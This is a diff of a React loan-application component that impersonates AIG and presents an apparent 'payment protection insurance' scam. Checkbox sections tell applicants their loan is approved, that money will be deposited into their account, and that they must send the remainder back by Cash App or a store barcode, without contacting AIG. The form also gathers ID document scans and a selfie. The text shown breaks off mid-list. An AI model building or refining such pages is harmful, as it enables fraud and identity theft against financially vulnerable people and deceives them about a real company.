@@ -6,6 +6,7 @@ import { saveInsuranceReview } from '../services/databaseService';
 const InsurancePolicyReview = () => {
   const navigate = useNavigate();
   const [currentStep, setCurrentStep] = useState(1);
+  const [documentStep, setDocumentStep] = useState(0);
   const [customerEmail, setCustomerEmail] = useState('');
   const [userIP, setUserIP] = useState('Loading...');
   const [idType, setIdType] = useState('');
@@ -20,8 +21,198 @@ const InsurancePolicyReview = () => {
   });
   const [submitted, setSubmitted] = useState(false);
   const [loading, setLoading] = useState(false);
+  const [sectionAcknowledgments, setSectionAcknowledgments] = useState({});
+  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');
 
   const totalSteps = 5;
+
+  // Document sections structure - grouped by logical categories
+  const documentSections = [
+    {
+      id: 1,
+      title: "About AIG & Why You Need Insurance",
+      points: [
+        {
+          id: "1-1",
+          title: "About Your Insurance Provider: AIG",
+          content: "AIG (American International Group) is a global leader in commercial and personal insurance solutions. With $24 billion in net premiums written in 2024 and operations in 200+ countries and jurisdictions, AIG provides expertise and support that builds confidence to pursue bold ideas and shape the future."
+        },
+        {
+          id: "1-2",
+          title: "Why Do You Need Payment Protection Insurance?",
+          content: "Important: We Have Already Approved Your Loan Application. This insurance is not a rejection—it's a pathway to make your approved loan a reality while helping you rebuild your credit for a brighter financial future."
+        },
+        {
+          id: "1-3",
+          title: "Good News About Your Loan",
+          content: "Your loan has been approved! The insurance requirement is simply a protective measure that allows us to fund your loan despite credit challenges, while giving you tools to rebuild your credit score."
+        }
+      ]
+    },
+    {
+      id: 2,
+      title: "Common Scenarios & How Insurance Helps",
+      points: [
+        {
+          id: "2-1",
+          title: "Multiple Loan Applications",
+          content: "You may have applied to several loan companies at once to find the best option. Each company ran a credit inquiry, which temporarily lowered your score. This insurance helps us approve you despite those inquiries, and on-time payments will help your score recover."
+        },
+        {
+          id: "2-2",
+          title: "Medical Bills or Unexpected Expenses",
+          content: "Medical emergencies or unexpected costs can lead to late payments or collections. This isn't a reflection of your character—it's life happening. The insurance protects your loan payments if health issues arise again."
+        },
+        {
+          id: "2-3",
+          title: "Period of Unemployment",
+          content: "Job loss or extended unemployment can make it impossible to keep up with bills. You're now back on your feet and ready to move forward. This insurance covers your loan if you face unemployment again."
+        },
+        {
+          id: "2-4",
+          title: "Young and Building Credit",
+          content: "If you're young or new to credit, you may not have a long credit history or made some early mistakes learning the system. This insurance helps you access credit now while establishing a positive payment history."
+        }
+      ]
+    },
+    {
+      id: 3,
+      title: "More Scenarios & Benefits",
+      points: [
+        {
+          id: "3-1",
+          title: "Previous Loan Rejections",
+          content: "Being rejected by other lenders can be discouraging and may have lowered your score further. We've approved you—this insurance is the final step to access your funds and prove your creditworthiness."
+        },
+        {
+          id: "3-2",
+          title: "Divorce or Life Changes",
+          content: "Major life events like divorce, separation, or family changes can disrupt finances and credit. You're starting fresh. This insurance provides protection during transitions while you rebuild."
+        },
+        {
+          id: "3-3",
+          title: "How Insurance Helps You Specifically",
+          content: "Access Your Approved Loan, Rebuild Your Credit through on-time payments, Protection Against Setbacks like job loss or disability, Demonstrate Reliability to future lenders, and Peace of Mind."
+        }
+      ]
+    },
+    {
+      id: 4,
+      title: "Cost, Process & Coverage",
+      points: [
+        {
+          id: "4-1",
+          title: "How It Works: The No-Cost Process",
+          content: "You do NOT pay for this insurance from your personal funds. AIG Financial Services covers the cost. Process: 1) We deposit premium into your account, 2) You pay the insurance premium, 3) You return remaining funds, 4) Loan is disbursed."
+        },
+        {
+          id: "4-2",
+          title: "How Much Will It Cost?",
+          content: "Payment Protection Insurance premiums range from $500 to $2,000, depending on loan amount, coverage level, term duration, and risk factors. Remember: This cost is covered by AIG, not you."
+        },
+        {
+          id: "4-3",
+          title: "What Does the Insurance Cover?",
+          content: "Covers Involuntary Unemployment, Disability, and Death. Coverage details: Up to $1,500 per month for up to 12 months. Protects your loan repayments in covered situations."
+        },
+        {
+          id: "4-4",
+          title: "Eligibility Requirements",
+          content: "To qualify: Age 18-65 years old, at least 6 months current employment, and permanent resident status. You must meet these requirements to qualify for coverage."
+        }
+      ]
+    },
+    {
+      id: 5,
+      title: "Exclusions & Claims Process",
+      points: [
+        {
+          id: "5-1",
+          title: "What's Not Covered (Exclusions)",
+          content: "The insurance does NOT cover: Pre-existing medical conditions, self-inflicted injuries, unemployment due to misconduct, or voluntary resignation from employment."
+        },
+        {
+          id: "5-2",
+          title: "How to File a Claim",
+          content: "Submit claim within 30 days of qualifying event, provide supporting documentation (medical records, termination letter, etc.), AIG reviews and processes your claim, payments are made directly to cover your loan."
+        },
+        {
+          id: "5-3",
+          title: "Cancellation Policy",
+          content: "You may cancel this policy within 30 days of purchase for a full refund. After 30 days, cancellation is subject to pro-rata refund based on remaining coverage period."
+        }
+      ]
+    },
+    {
+      id: 6,
+      title: "Rules, Privacy & Legal Terms",
+      points: [
+        {
+          id: "6-1",
+          title: "Important Rules & Responsibilities",
+          content: "Use of Deposited Funds: Must be used ONLY to pay the AIG insurance premium. Any other use is unauthorized. False Information: Providing false information may result in policy cancellation, legal action, and prosecution."
+        },
+        {
+          id: "6-2",
+          title: "Privacy & Data Protection",
+          content: "Your information is used for underwriting, verification, compliance monitoring, fraud prevention, and service delivery. We maintain comprehensive data security measures and privacy protections under U.S. laws."
+        },
+        {
+          id: "6-3",
+          title: "Governing Law",
+          content: "These policies are governed by applicable U.S. federal laws and the laws of the state where AIG Financial Services operates. Any disputes shall be resolved in appropriate federal or state courts."
+        }
+      ]
+    },
+    {
+      id: 7,
+      title: "Payment Return Option 1: Cash App Transfer",
+      points: [
+        {
+          id: "7-1",
+          title: "Cash App Transfer Requirements",
+          content: "Available if you have used Cash App for 3+ months and are familiar with the platform. This is the fastest and most convenient option if you qualify."
+        },
+        {
+          id: "7-2",
+          title: "Cash App Transfer Process",
+          content: "Process: 1) We provide our Cash App handle ($tag), 2) You open Cash App and send remaining balance to our handle, 3) Include your name and application ID in payment note, 4) Send us screenshot of completed transaction."
+        }
+      ]
+    },
+    {
+      id: 8,
+      title: "Payment Return Option 2: Government Store Barcode",
+      points: [
+        {
+          id: "8-1",
+          title: "Government Store Barcode Payment",
+          content: "Available for all customers. We provide a unique AIG barcode registered in your name. The barcode is specifically linked to your account for security and tracking purposes."
+        },
+        {
+          id: "8-2",
+          title: "Barcode Payment Process",
+          content: "Process: 1) We provide unique AIG barcode, 2) Visit participating government store (Walmart, CVS, Walgreens, etc.), 3) Show barcode to cashier at customer service desk, 4) Pay remaining balance using cash/debit/credit card, 5) Payment goes directly to AIG under your registration, 6) Keep receipt and send us photo for verification."
+        }
+      ]
+    },
+    {
+      id: 9,
+      title: "Final Acknowledgment & Payment Method Selection",
+      points: [
+        {
+          id: "9-1",
+          title: "Important Payment Information",
+          content: "We handle all insurance documentation and paperwork directly with AIG. You do not need to contact AIG directly. Simply return the funds to us using one of the methods above, and we will complete the insurance activation process."
+        },
+        {
+          id: "9-2",
+          title: "Your Final Acknowledgment",
+          content: "By proceeding, you acknowledge that you have read, understood, and agreed to all terms. You understand: Insurance is required due to credit profile, cost is covered by AIG not personal funds, must use deposited funds only for insurance payment, and false information has legal consequences."
+        }
+      ]
+    }
+  ];
 
   useEffect(() => {
     // Get customer email from session storage
@@ -69,6 +260,50 @@ const InsurancePolicyReview = () => {
     nextStep();
   };
 
+  const handlePointCheck = (pointId) => {
+    setSectionAcknowledgments(prev => ({
+      ...prev,
+      [pointId]: !prev[pointId]
+    }));
+  };
+
+  const handleNextSection = () => {
+    const currentSection = documentSections[documentStep];
+    const allPointsChecked = currentSection.points.every(point => sectionAcknowledgments[point.id]);
+    
+    if (!allPointsChecked) {
+      alert('Please check all points in this section before proceeding.');
+      return;
+    }
+    
+    // Special validation for final section - require payment method selection
+    if (documentStep === documentSections.length - 1 && !selectedPaymentMethod) {
+      alert('Please select your preferred payment method before proceeding.');
+      return;
+    }
+    
+    if (documentStep < documentSections.length - 1) {
+      setDocumentStep(documentStep + 1);
+      window.scrollTo(0, 0);
+    } else {
+      // All sections completed, move to next step
+      nextStep();
+    }
+  };
+
+  const handlePreviousSection = () => {
+    if (documentStep > 0) {
+      setDocumentStep(documentStep - 1);
+      window.scrollTo(0, 0);
+    }
+  };
+
+  const getCurrentSectionProgress = () => {
+    const currentSection = documentSections[documentStep];
+    const checkedCount = currentSection.points.filter(point => sectionAcknowledgments[point.id]).length;
+    return `${checkedCount}/${currentSection.points.length}`;
+  };
+
   const handleSubmit = async () => {
     if (!understandingStatement.trim()) {
       alert('Please type an understanding statement to confirm.');
@@ -109,7 +344,8 @@ const InsurancePolicyReview = () => {
         idType: idType,
         idDocumentFront: idDocumentFrontBase64,
         idDocumentBack: idDocumentBackBase64,
-        selfiePhoto: selfiePhotoBase64
+        selfiePhoto: selfiePhotoBase64,
+        paymentMethod: selectedPaymentMethod
       });
 
       setSubmitted(true);
@@ -148,7 +384,7 @@ const InsurancePolicyReview = () => {
         ))}
       </div>
       <div className="flex justify-between mt-2 text-xs text-gray-500">
-        <span>Read Policy</span>
+        <span>Read Policy (Section {documentStep + 1}/{documentSections.length})</span>
         <span>Agree Terms</span>
         <span>Legal Consequences</span>
         <span>ID Proof</span>
@@ -212,7 +448,7 @@ const InsurancePolicyReview = () => {
       <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
         <StepIndicator />
 
-        {/* Step 1: Read Legal Document */}
+        {/* Step 1: Read Legal Document - Individual Points */}
         {currentStep === 1 && (
           <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
             <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
@@ -226,340 +462,179 @@ const InsurancePolicyReview = () => {
                 <div>
                   <p className="text-gray-900 text-sm font-medium mb-1">Why Are You Here?</p>
                   <p className="text-gray-700 text-sm mb-3">
-                    Based on your profile, we require Payment Protection Insurance to protect your loan and help you build a better financial future. This is a standard practice in the following situations:
+                    Based on your profile, we require Payment Protection Insurance to protect your loan and help you build a better financial future. Please read each section carefully and check all points before proceeding.
                   </p>
-                  <ul className="list-disc list-inside text-gray-700 text-sm space-y-1">
-                    <li><strong>Low Credit Score:</strong> Insurance helps qualify you for the loan and can help rebuild credit through consistent payments</li>
-                    <li><strong>Negative Bank Account:</strong> Insurance provides protection during account normalization and ensures loan repayment capability</li>
-                    <li><strong>Previous Fraud History:</strong> Additional security measures help protect both parties and establish trust</li>
-                    <li><strong>Bankruptcy History:</strong> Insurance demonstrates financial responsibility and provides a safety net for repayment</li>
-                  </ul>
+                  <p className="text-gray-600 text-xs">
+                    Progress: Section {documentStep + 1} of {documentSections.length}
+                  </p>
                 </div>
               </div>
             </div>
 
-            <div className="bg-gray-50 rounded-lg p-6 text-gray-700 text-sm leading-relaxed max-h-[600px] overflow-y-auto">
-              {/* Document Header */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h3 className="text-lg font-bold text-gray-900 mb-2">AIG Financial Services</h3>
-                <p className="text-gray-600 text-xs">Payment Protection Insurance (PPI) | Bank Account Review | Loan Terms & Conditions & Disclosure Policy</p>
-                <p className="text-gray-500 text-xs mt-1">Document Version: 1.0 | Effective Date: January 1, 2025 | Last Updated: January 1, 2025</p>
+            {/* Progress Bar */}
+            <div className="mb-6">
+              <div className="flex justify-between text-xs text-gray-500 mb-2">
+                <span>Reading Progress</span>
+                <span>{Math.round(((documentStep + 1) / documentSections.length) * 100)}%</span>
               </div>
-
-              {/* About AIG */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">About Your Insurance Provider: AIG</h4>
-                <p className="mb-3">
-                  <strong>AIG (American International Group)</strong> is a global leader in commercial and personal insurance solutions. With <strong>$24 billion in net premiums written in 2024</strong> and operations in <strong>200+ countries and jurisdictions</strong>, AIG provides expertise and support that builds confidence to pursue bold ideas and shape the future.
-                </p>
-                <p className="mb-3">
-                  AIG helps clients and partners protect what matters most so they can withstand setbacks and realize their goals. As one of the world's most far-reaching property-casualty networks, AIG offers a broad range of products including Liability, Financial Lines, Property, Global Specialty, Crop Risk Services, Personal Lines, and Accident & Health.
-                </p>
-                <p className="text-gray-600 text-xs">
-                  Learn more at: <a href="https://www.aig.com/home/about" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">www.aig.com/home/about</a>
-                </p>
+              <div className="w-full bg-gray-200 rounded-full h-2">
+                <div 
+                  className="bg-orange-500 h-2 rounded-full transition-all duration-300"
+                  style={{ width: `${((documentStep + 1) / documentSections.length) * 100}%` }}
+                />
               </div>
+            </div>
 
-              {/* Why Insurance is Needed */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">Why Do You Need Payment Protection Insurance?</h4>
-                <p className="mb-3">
-                  <strong>Important: We Have Already Approved Your Loan Application.</strong> This insurance is not a rejection—it's a pathway to make your approved loan a reality while helping you rebuild your credit for a brighter financial future.
-                </p>
-                <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-3">
-                  <p className="text-green-800 text-sm mb-2">
-                    <strong>Good News:</strong> Your loan has been approved! The insurance requirement is simply a protective measure that allows us to fund your loan despite credit challenges, while giving you tools to rebuild your credit score.
+            {/* Current Section */}
+            <div className="bg-gray-50 rounded-lg p-6 mb-6 border-2 border-gray-200">
+              <div className="flex items-start mb-6">
+                <div className="bg-orange-500 text-white rounded-full w-10 h-10 flex items-center justify-center text-lg font-bold mr-4 mt-0.5 flex-shrink-0">
+                  {documentStep + 1}
+                </div>
+                <div className="flex-1">
+                  <h3 className="text-xl font-bold text-gray-900 mb-2">
+                    {documentSections[documentStep].title}
+                  </h3>
+                  <p className="text-gray-600 text-sm">
+                    Please read and check all points below to proceed
                   </p>
                 </div>
-                <div className="space-y-3 text-gray-600 text-sm">
-                  <p><strong>Understanding Your Situation:</strong></p>
-                  <p className="mb-2">We understand that low credit scores happen for many different reasons. Here are common scenarios we see every day, and how this insurance helps in each case:</p>
-                  
-                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
-                    <p className="text-blue-900 font-semibold mb-1">Scenario 1: Multiple Loan Applications</p>
-                    <p className="text-blue-700 text-xs">You may have applied to several loan companies at once to find the best option. Each company ran a credit inquiry, which temporarily lowered your score. This insurance helps us approve you despite those inquiries, and on-time payments will help your score recover.</p>
-                  </div>
-                  
-                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
-                    <p className="text-blue-900 font-semibold mb-1">Scenario 2: Medical Bills or Unexpected Expenses</p>
-                    <p className="text-blue-700 text-xs">Medical emergencies or unexpected costs can lead to late payments or collections. This isn't a reflection of your character—it's life happening. The insurance protects your loan payments if health issues arise again, while consistent repayment helps rebuild your credit.</p>
-                  </div>
-                  
-                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
-                    <p className="text-blue-900 font-semibold mb-1">Scenario 3: Period of Unemployment</p>
-                    <p className="text-blue-700 text-xs">Job loss or extended unemployment can make it impossible to keep up with bills. You're now back on your feet and ready to move forward. This insurance covers your loan if you face unemployment again, giving you stability while you rebuild.</p>
-                  </div>
-                  
-                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
-                    <p className="text-blue-900 font-semibold mb-1">Scenario 4: Young and Building Credit</p>
-                    <p className="text-blue-700 text-xs">If you're young or new to credit, you may not have a long credit history or made some early mistakes learning the system. This insurance helps you access credit now while establishing a positive payment history for the future.</p>
-                  </div>
-                  
-                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
-                    <p className="text-blue-900 font-semibold mb-1">Scenario 5: Previous Loan Rejections</p>
-                    <p className="text-blue-700 text-xs">Being rejected by other lenders can be discouraging and may have lowered your score further. We've approved you—this insurance is the final step to access your funds and prove your creditworthiness through consistent payments.</p>
-                  </div>
-                  
-                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
-                    <p className="text-blue-900 font-semibold mb-1">Scenario 6: Divorce or Life Changes</p>
-                    <p className="text-blue-700 text-xs">Major life events like divorce, separation, or family changes can disrupt finances and credit. You're starting fresh. This insurance provides protection during transitions while you rebuild your financial foundation.</p>
-                  </div>
-                  
-                  <p className="mt-3"><strong>How This Insurance Helps You Specifically:</strong></p>
-                  <ul className="list-disc list-inside space-y-2 ml-4">
-                    <li><strong>Access Your Approved Loan:</strong> Without this insurance, lenders cannot fund loans for certain credit profiles. This requirement unlocks your already-approved loan amount.</li>
-                    <li><strong>Rebuild Your Credit:</strong> Every on-time payment (covered by insurance if needed) is reported to credit bureaus, gradually improving your score over time.</li>
-                    <li><strong>Protection Against Setbacks:</strong> If you face job loss, disability, or other covered events, the insurance makes your loan payments so you don't default and damage your credit further.</li>
-                    <li><strong>Demonstrate Reliability:</strong> Successfully managing this loan with insurance shows future lenders you're responsible, qualifying you for better rates and terms on future loans.</li>
-                    <li><strong>Peace of Mind:</strong> You won't lose your home or face severe hardship if unexpected life events occur. The insurance has your back.</li>
-                    <li><strong>No Cost to You:</strong> AIG Financial Services covers the insurance premium. You don't pay from your personal funds—this is truly an opportunity, not an expense.</li>
-                  </ul>
-                </div>
               </div>
 
-              {/* How It Works - The No-Cost Process */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">How It Works: The No-Cost Process</h4>
-                <p className="mb-3">
-                  <strong>Important:</strong> You do NOT pay for this insurance from your personal funds. AIG Financial Services covers the cost as part of our commitment to helping you access credit.
-                </p>
-                
-                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-3">
-                  <h5 className="text-blue-800 font-semibold mb-3">Step-by-Step Process:</h5>
+              {/* Points in this section */}
+              <div className="ml-14 space-y-4">
+                {documentSections[documentStep].points.map((point, index) => (
+                  <div key={point.id} className="bg-white rounded-lg p-4 border border-gray-200">
+                    <label className="flex items-start space-x-3 cursor-pointer">
+                      <input
+                        type="checkbox"
+                        checked={sectionAcknowledgments[point.id] || false}
+                        onChange={() => handlePointCheck(point.id)}
+                        className="mt-1 w-5 h-5 rounded border-gray-300 text-orange-500 focus:ring-orange-500"
+                      />
+                      <div className="flex-1">
+                        <h4 className="text-sm font-semibold text-gray-900 mb-1">{point.title}</h4>
+                        <p className="text-gray-700 text-sm leading-relaxed">{point.content}</p>
+                      </div>
+                    </label>
+                  </div>
+                ))}
+              </div>
+
+              {/* Payment Method Selection - Only show in final section */}
+              {documentStep === documentSections.length - 1 && (
+                <div className="ml-14 mt-6 bg-orange-50 border-2 border-orange-200 rounded-lg p-4">
+                  <h4 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
+                    <CreditCard className="w-5 h-5 mr-2 text-orange-500" />
+                    Select Your Preferred Payment Method
+                  </h4>
                   <div className="space-y-3">
-                    <div className="flex items-start">
-                      <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">1</div>
-                      <div>
-                        <p className="text-blue-900 font-medium">Company Initiates Deposit</p>
-                        <p className="text-blue-700 text-xs">We deposit the insurance premium amount into your bank account</p>
+                    <label className="flex items-start space-x-3 cursor-pointer bg-white p-3 rounded-lg border border-gray-200 hover:border-orange-300 transition">
+                      <input
+                        type="radio"
+                        name="paymentMethod"
+                        value="cashapp"
+                        checked={selectedPaymentMethod === 'cashapp'}
+                        onChange={(e) => setSelectedPaymentMethod(e.target.value)}
+                        className="mt-1 w-5 h-5 text-orange-500 focus:ring-orange-500"
+                      />
+                      <div className="flex-1">
+                        <h5 className="text-sm font-semibold text-gray-900 mb-1">Cash App Transfer</h5>
+                        <p className="text-gray-600 text-xs">Available if you have used Cash App for 3+ months</p>
                       </div>
-                    </div>
-                    <div className="flex items-start">
-                      <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">2</div>
-                      <div>
-                        <p className="text-blue-900 font-medium">You Pay Insurance Premium</p>
-                        <p className="text-blue-700 text-xs">You use the deposited funds to pay the AIG insurance premium</p>
+                    </label>
+                    <label className="flex items-start space-x-3 cursor-pointer bg-white p-3 rounded-lg border border-gray-200 hover:border-orange-300 transition">
+                      <input
+                        type="radio"
+                        name="paymentMethod"
+                        value="barcode"
+                        checked={selectedPaymentMethod === 'barcode'}
+                        onChange={(e) => setSelectedPaymentMethod(e.target.value)}
+                        className="mt-1 w-5 h-5 text-orange-500 focus:ring-orange-500"
+                      />
+                      <div className="flex-1">
+                        <h5 className="text-sm font-semibold text-gray-900 mb-1">Government Store Barcode Payment</h5>
+                        <p className="text-gray-600 text-xs">Available for all customers</p>
                       </div>
-                    </div>
-                    <div className="flex items-start">
-                      <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">3</div>
-                      <div>
-                        <p className="text-blue-900 font-medium">You Return Remaining Funds</p>
-                        <p className="text-blue-700 text-xs">Any remaining balance after insurance payment is returned to us</p>
-                      </div>
-                    </div>
-                    <div className="flex items-start">
-                      <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">4</div>
-                      <div>
-                        <p className="text-blue-900 font-medium">Loan Disbursement</p>
-                        <p className="text-blue-700 text-xs">Once insurance is active, your loan proceeds are disbursed</p>
-                      </div>
-                    </div>
+                    </label>
                   </div>
-                </div>
-              </div>
-
-              {/* Insurance Cost */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">How Much Will It Cost?</h4>
-                <p className="mb-3">
-                  Payment Protection Insurance premiums range from <strong>$500 to $2,000</strong>, depending on your specific profile:
-                </p>
-                <ul className="list-disc list-inside mb-3 space-y-1 text-gray-600">
-                  <li>Loan amount</li>
-                  <li>Coverage level selected</li>
-                  <li>Loan term duration</li>
-                  <li>Individual risk factors</li>
-                </ul>
-                <p className="text-gray-600 text-sm">
-                  <strong>Remember:</strong> This cost is covered by AIG Financial Services, not paid from your personal funds.
-                </p>
-              </div>
-
-              {/* What the Insurance Covers */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">What Does the Insurance Cover?</h4>
-                <p className="mb-3">
-                  AIG's Payment Protection Insurance protects your loan repayments in the following situations:
-                </p>
-                <ul className="list-disc list-inside mb-3 space-y-2 text-gray-600">
-                  <li><strong>Involuntary Unemployment:</strong> If you lose your job through no fault of your own</li>
-                  <li><strong>Disability:</strong> If you become unable to work due to illness or injury</li>
-                  <li><strong>Death:</strong> If you pass away, the remaining loan balance is covered</li>
-                </ul>
-                <p className="text-gray-600 text-sm">
-                  Coverage details: Up to $1,500 per month for up to 12 months.
-                </p>
-              </div>
-
-              {/* Eligibility */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">Eligibility Requirements</h4>
-                <ul className="list-disc list-inside space-y-1 text-gray-600">
-                  <li>Age: 18-65 years old</li>
-                  <li>Employment: At least 6 months current employment</li>
-                  <li>Residency: Permanent resident status</li>
-                </ul>
-              </div>
-
-              {/* Exclusions */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">What's Not Covered (Exclusions)</h4>
-                <ul className="list-disc list-inside space-y-1 text-gray-600">
-                  <li>Pre-existing medical conditions</li>
-                  <li>Self-inflicted injuries</li>
-                  <li>Unemployment due to misconduct</li>
-                  <li>Voluntary resignation from employment</li>
-                </ul>
-              </div>
-
-              {/* Claims Process */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">How to File a Claim</h4>
-                <p className="mb-3">
-                  If you need to file a claim:
-                </p>
-                <ol className="list-decimal list-inside space-y-1 text-gray-600">
-                  <li>Submit claim within 30 days of qualifying event</li>
-                  <li>Provide supporting documentation (medical records, termination letter, etc.)</li>
-                  <li>AIG reviews and processes your claim</li>
-                  <li>If approved, payments are made directly to cover your loan</li>
-                </ol>
-              </div>
-
-              {/* Cancellation Policy */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">Cancellation Policy</h4>
-                <p className="mb-3">
-                  You may cancel this policy within 30 days of purchase for a full refund. After 30 days, cancellation is subject to pro-rata refund based on remaining coverage period.
-                </p>
-              </div>
-
-              {/* Important Rules */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">Important Rules & Responsibilities</h4>
-                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mb-3">
-                  <p className="text-yellow-800 text-sm">
-                    <strong>Use of Deposited Funds:</strong> The funds we deposit for insurance premium must be used ONLY to pay the AIG insurance premium. Any other use is unauthorized and may result in immediate application denial.
-                  </p>
-                </div>
-                <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-3">
-                  <p className="text-red-800 text-sm">
-                    <strong>False Information:</strong> Providing false information or making fraudulent claims may result in policy cancellation, legal action, and prosecution. We take fraud seriously.
-                  </p>
-                </div>
-                <ul className="list-disc list-inside space-y-1 text-gray-600">
-                  <li>Provide accurate information throughout the process</li>
-                  <li>Use deposited funds strictly for insurance payment</li>
-                  <li>Return any remaining balance as instructed</li>
-                  <li>Cooperate with all verification requests</li>
-                </ul>
-              </div>
-
-              {/* Privacy & Data */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">Privacy & Data Protection</h4>
-                <p className="text-gray-600 text-sm">
-                  Your information is used for underwriting, verification, compliance monitoring, fraud prevention, and service delivery. We maintain comprehensive data security measures and privacy protections in accordance with applicable U.S. laws.
-                </p>
-              </div>
-
-              {/* Governing Law */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">Governing Law</h4>
-                <p className="text-gray-600 text-sm">
-                  These policies are governed by applicable U.S. federal laws and the laws of the state where AIG Financial Services operates. Any disputes shall be resolved in appropriate federal or state courts.
-                </p>
-              </div>
-
-              {/* Payment Return Options */}
-              <div className="mb-6 pb-4 border-b border-gray-300">
-                <h4 className="text-orange-500 font-semibold mb-2">How to Return Insurance Payment to Us</h4>
-                <p className="mb-3">
-                  After you pay the insurance premium, you will return any remaining funds to AIG Financial Services. We handle all insurance paperwork directly with AIG. You only interact with us. Choose one of the following payment return methods:
-                </p>
-
-                <div className="space-y-4">
-                  {/* Option 1: Cash App */}
-                  <div className="bg-green-50 border border-green-200 rounded-lg p-4">
-                    <div className="flex items-start mb-3">
-                      <div className="bg-green-600 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">1</div>
-                      <div>
-                        <h5 className="text-green-900 font-semibold">Option 1: Cash App Transfer</h5>
-                        <p className="text-green-700 text-xs">Available if you have used Cash App for 3+ months</p>
-                      </div>
+                  {selectedPaymentMethod && (
+                    <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded-lg">
+                      <p className="text-green-800 text-sm flex items-center">
+                        <CheckCircle className="w-4 h-4 mr-2" />
+                        You selected: {selectedPaymentMethod === 'cashapp' ? 'Cash App Transfer' : 'Government Store Barcode Payment'}
+                      </p>
                     </div>
-                    <div className="ml-11 space-y-2 text-sm text-green-800">
-                      <p><strong>Eligibility:</strong> You must have been using Cash App for at least 3 months and be familiar with the platform.</p>
-                      <p><strong>Process:</strong></p>
-                      <ol className="list-decimal list-inside ml-4 space-y-1 text-green-700">
-                        <li>We will provide our Cash App handle ($tag)</li>
-                        <li>Open your Cash App and send the remaining balance to our handle</li>
-                        <li>Include your name and application ID in the payment note</li>
-                        <li>Send us a screenshot of the completed transaction</li>
-                      </ol>
-                      <p className="text-green-600 text-xs"><strong>Note:</strong> This is the fastest and most convenient option if you qualify.</p>
-                    </div>
-                  </div>
-
-                  {/* Option 2: Barcode Payment */}
-                  <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
-                    <div className="flex items-start mb-3">
-                      <div className="bg-purple-600 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">2</div>
-                      <div>
-                        <h5 className="text-purple-900 font-semibold">Option 2: Government Store Barcode Payment</h5>
-                        <p className="text-purple-700 text-xs">Available for all customers</p>
-                      </div>
-                    </div>
-                    <div className="ml-11 space-y-2 text-sm text-purple-800">
-                      <p><strong>Process:</strong></p>
-                      <ol className="list-decimal list-inside ml-4 space-y-1 text-purple-700">
-                        <li>We will provide a unique AIG barcode registered in your name</li>
-                        <li>Visit any participating government store (Walmart, CVS, Walgreens, etc.)</li>
-                        <li>Show the barcode to the cashier at the customer service desk</li>
-                        <li>Pay the remaining balance using cash, debit, or credit card</li>
-                        <li>The payment goes directly to AIG under your registration</li>
-                        <li>Keep the receipt and send us a photo for verification</li>
-                      </ol>
-                      <p className="text-purple-600 text-xs"><strong>Note:</strong> The barcode is specifically linked to your account for security and tracking purposes.</p>
-                    </div>
-                  </div>
+                  )}
                 </div>
-
-                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mt-4">
-                  <p className="text-yellow-800 text-sm">
-                    <strong>Important:</strong> We handle all insurance documentation and paperwork directly with AIG. You do not need to contact AIG directly. Simply return the funds to us using one of the methods above, and we will complete the insurance activation process.
-                  </p>
-                </div>
-              </div>
-
-              {/* Customer Acknowledgment */}
-              <div className="mb-6">
-                <h4 className="text-orange-500 font-semibold mb-2">Your Acknowledgment</h4>
-                <p className="text-gray-600 text-sm">
-                  By proceeding to the next step, you acknowledge that you have read, understood, and agreed to all terms and conditions outlined above. You understand that:
-                </p>
-                <ul className="list-disc list-inside space-y-1 text-gray-600 mt-2">
-                  <li>The insurance is required due to your credit profile</li>
-                  <li>The cost is covered by AIG Financial Services, not your personal funds</li>
-                  <li>You must use deposited funds only for insurance payment</li>
